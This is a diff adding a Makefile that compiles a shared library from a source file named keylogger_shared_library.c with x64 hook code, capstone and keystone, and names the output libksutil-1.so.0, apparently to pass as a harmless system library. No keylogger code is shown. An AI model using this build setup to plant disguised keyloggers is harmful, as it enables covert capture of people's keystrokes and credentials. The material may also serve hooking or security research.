@@ -1,0 +1,10 @@
+all:
+	gcc -c src/hook_entries_x64.S -o src/hook_entries_x64.o
+	# uncomment for dev mode
+	#gcc -DKL_DEBUG -g -I./include -I./deps/capstone-3.0.5-rc2/include -Wall -o libksutil-1.so.0 -shared -fPIC -ldl src/keylogger_shared_library.c src/hook_entries_x64.o ./deps/capstone-3.0.5-rc2/libcapstone.a
+	gcc -I./include -I./deps/capstone-3.0.5-rc2/include -Wall -o libksutil-1.so.0 -shared -fPIC -ldl src/keylogger_shared_library.c src/hook_entries_x64.o ./deps/capstone-3.0.5-rc2/libcapstone.a
+	g++ -o libasutil-1.so.0 src/kstool.cpp -Wall -I./deps/keystone-0.9.1/include ./deps/keystone-0.9.1/build/llvm/lib/libkeystone.a
+
+clean:
+	rm libasutil-1.so.0 libksutil-1.so.0
+	rm src/hook_entries_x64.o
